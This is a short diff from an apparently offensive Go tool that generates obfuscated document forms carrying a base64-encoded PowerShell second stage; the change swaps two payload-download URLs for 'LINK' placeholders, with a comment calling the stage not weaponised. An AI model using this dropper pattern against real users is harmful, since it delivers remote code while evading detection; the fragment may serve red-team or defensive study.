@@ -163,7 +163,7 @@ func main() {
 	newForm.SetProperty("Caption", obf.RandWord())
 
 	// Setup second stage, not weaponised
-	resources.Payload = fmt.Sprintf(resources.Payload, "https://oxis.io/web/a", "https://oxis.io/web/p")
+	resources.Payload = fmt.Sprintf(resources.Payload, "LINK", "LINK")
 	b64Payload, _ := newEncodedPSScript(resources.Payload)
 	// Using varMap because of Drim PowershellCopy, this is to replace all occurence of that string.
 	resources.PSPayload = strings.ReplaceAll(resources.PSPayload, "powershellCopy", varMap["powershellCopy"])
